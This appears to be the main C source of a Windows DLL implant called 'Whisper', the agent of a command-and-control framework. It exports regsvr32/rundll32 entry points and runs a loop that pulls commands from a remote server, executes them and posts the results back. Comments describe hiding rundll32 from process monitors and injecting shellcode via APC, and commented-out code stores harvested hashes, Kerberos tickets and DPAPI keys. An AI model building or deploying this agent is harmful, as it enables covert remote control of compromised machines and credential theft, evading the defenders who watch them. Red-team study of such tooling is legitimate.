#include "comms_http.h"
#include "type_conversions.h"
#include "whisper_commands.h"
#include "whisper_config.h"
#include "whisper_json.h"
#include "whisper_winapi.h"
#include "whisper_dynamic_config.h"
#include "whisper_credmanager.h"
#include <time.h>
#include <stdint.h>
#include <stdio.h>
#include <windows.h>
// Function prototype
// int execute();
DWORD execute(LPVOID exec_args);
void generate_uuid4(char *agent_id);
void execution_setup(char *agent_id, CONFIG *config);
// Standard Exported Functions

// note: The thread allows for the functions to detach/return okay, makes it more normal + cleaner
// this also seems to hide rundll32 from showing up in processhacker. cewl

// other ideas: Queue APC call to start if doing shellcode

// COM
__declspec(dllexport) HRESULT DllRegisterServer()
{
    MessageBox(NULL, "Executed via DllRegisterServer!", "DLL Execution", MB_OK);
    main();
    return S_OK;
}
// COM
__declspec(dllexport) HRESULT DllUnregisterServer()
{
    MessageBox(NULL, "Executed via DllUnregisterServer!", "DLL Execution", MB_OK);
    main();
    return S_OK;
}

// Other options
__declspec(dllexport) void CALLBACK Run(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
    MessageBox(NULL, "Executed via Run!", "DLL Execution", MB_OK);
    main();
}
// Other options
__declspec(dllexport) void Start()
{
    // MessageBox(NULL, "Executed via Start!", "DLL Execution", MB_OK);
    //  HANDLE thread = WhisperCreateThread(NULL, 0, BeaconLoop, NULL, 0, NULL);
    //  if (thread) CloseHandle(thread);
    main();
}

// Global flag for thread control
// volatile BOOL keepRunning = TRUE;

// Entry point for the DLL
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        DEBUG_LOG("[DLL] Loaded into process\n");
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        DEBUG_LOG("[DLL] Unloaded from process\n");
        // keepRunning = FALSE;
        break;
    }
    return TRUE;
}

int main()
{

    DEBUG_LOG("STARTING");

    char agent_id[37];
    generate_uuid4(agent_id);
    CONFIG *config = init_config();

    // Example of setting the execution mode (you can do this at any point in your code)
    set_execution_mode(EXEC_MODE_SYNC, config); // Initially run synchronously

    while (1)
    {
        execution_setup(agent_id, config); // Call the command execution function
        DEBUG_LOG("EXECUTION SUCCESS");

        // WhisperSleep(get_sleep_time());
        // Sleep is in MS, so we take the input of sleep time * 1000 to get seconds
        WhisperSleep(1000 * get_sleep_time(config));
    }

    return 0;
}

// Function to execute the command (switching logic)
void execution_setup(char *agent_id, CONFIG *config)
{
    // ... command checking logic (when you implement it) ...

    // Setup exec args for the thread run
    // WhisperCreateThread only takes one arg arg, so this is how to pass multiple
    EXEC_ARGS *exec_args = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(EXEC_ARGS));
    if (!exec_args)
        return; // handle allocation error

    exec_args->agent_id = agent_id;
    exec_args->config = config;

    switch (get_execution_mode(config))
    {
    case EXEC_MODE_ASYNC:
    {
        DEBUG_LOG("ASYNC\n");

        // Asynchronous execution (new thread)
        // need to move agent_id into struct with config to fix the mutliple args
        HANDLE thread = WhisperCreateThread(NULL, 0, execute, exec_args, 0, NULL);
        if (thread)
        {
            CloseHandle(thread); // Detach the thread
        }
        else
        {
            DEBUG_LOG("Failed to create thread.\n");
            HeapFree(GetProcessHeap(), 0, exec_args); // Clean up afterward if fails
        }
        break;
    }
    case EXEC_MODE_SYNC:
    {
        DEBUG_LOG("SYNC/INLINE\n");
        execute(exec_args);                       // Call the function directly
        HeapFree(GetProcessHeap(), 0, exec_args); // Clean up afterward if fails
        break;
    }
    default:
        DEBUG_LOG("Invalid execution mode.\n");
        // free heap allocated memory
        HeapFree(GetProcessHeap(), 0, exec_args);
        break;
    }
}

// Thread function for executing the command
DWORD WINAPI execute(LPVOID exec_args)
{

    // bug somewhere in here. yay
    //  add_credential("admin", "CORP",
    //              "31d6cfe0d16ae931b73c59d7e0c089c0", NULL, "P@ssw0rd!",
    //              "base64-KerbTGT", "aes128-key", "aes256-key",
    //              "dpapi-master-key");

    // display_credentials();

    // get data out of exec args that is needed for execution
    // rename to thread args otherwise it clashes with func arg
    EXEC_ARGS *thread_args = (EXEC_ARGS *)exec_args;

    char *agent_id = thread_args->agent_id;
    CONFIG *config = thread_args->config;

    // this fills in the command, arg and command_id
    InboundJsonDataStruct InboundJsonData = get_command_data(agent_id);
    // this populates the new structure with the agent_uuid
    InboundJsonData.agent_id = agent_id;

    if (!InboundJsonData.command)
    {
        DEBUG_LOG("Could not get command");

        if (InboundJsonData.command_id)
            free(InboundJsonData.command_id);
        if (InboundJsonData.args)
            free(InboundJsonData.args);

        return 1;
    }

    DEBUG_LOG("Decoded Command: %s\n", InboundJsonData.command);

    // go ahead and setup our struct for outbound comms
    // using calloc for init on the values here
    OutboundJsonDataStruct *OutboundJsonData = (OutboundJsonDataStruct *)calloc(1, sizeof(OutboundJsonDataStruct));
    if (!OutboundJsonData)
    {
        DEBUG_LOG("Memory allocation failed for OutboundJsonData.\n");
        return 1;
    }

    // Assign UUID
    OutboundJsonData->agent_id = strdup(agent_id); // Allocates memory and copies the string. Previous strncpy_s only copied, not allocated. Need to free
    OutboundJsonData->command_result_data = NULL;

    // Parse command and modify OutboundJsonData
    parse_command(InboundJsonData.command, InboundJsonData.args, OutboundJsonData, config);

    DEBUG_LOG("UUID: %s\n", OutboundJsonData->agent_id);
    DEBUG_LOG("COMMAND_ID: %s\n", InboundJsonData.command_id);
    DEBUG_LOG("command_result_data: %s\n", OutboundJsonData->command_result_data ? OutboundJsonData->command_result_data : "NULL");

    // Convert to JSON and send
    char *encoded_json_response = encode_json(OutboundJsonData->agent_id, OutboundJsonData->command_result_data, InboundJsonData.command_id);
    post_data(encoded_json_response, agent_id);

    // free allocated memory
    // need to double check this

    free(InboundJsonData.command);    // Allocated in decode_command_json
    free(InboundJsonData.command_id); // Allocated in decode_command_json
    free(InboundJsonData.args);       // Allocated in decode_command_json (if applicable)

    // Outbound freeing. Only need to free if using a func that allocates memory to a strucutre member
    free(OutboundJsonData->agent_id);            // freed due to 'OutboundJsonData->agent_id = strdup(agent_id);' line.
    free(OutboundJsonData->command_result_data); // freeing due to set_response_data function in whipser_commands.h
    free(OutboundJsonData);                      // freeing the strucutre itself: 'OutboundJsonDataStruct* OutboundJsonData = (OutboundJsonDataStruct*)calloc(1, sizeof(OutboundJsonDataStruct));'

    return 0;
}

// need to init here so CONFIG is not a global.

void generate_uuid4(char *uuid)
{
    uint8_t bytes[16];

    // Seed the random number generator
    srand((unsigned int)time(NULL));

    // Generate 16 random bytes
    for (int i = 0; i < 16; i++)
    {
        bytes[i] = rand() % 256;
    }

    // Set the version to 4 --> 0100
    bytes[6] = (bytes[6] & 0x0F) | 0x40;

    // Set the variant to 10xxxxxx
    bytes[8] = (bytes[8] & 0x3F) | 0x80;

    // Format UUID as a string
    sprintf_s(uuid, 37,
              "%02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x",
              bytes[0], bytes[1], bytes[2], bytes[3],
              bytes[4], bytes[5],
              bytes[6], bytes[7],
              bytes[8], bytes[9],
              bytes[10], bytes[11], bytes[12], bytes[13], bytes[14], bytes[15]);
}
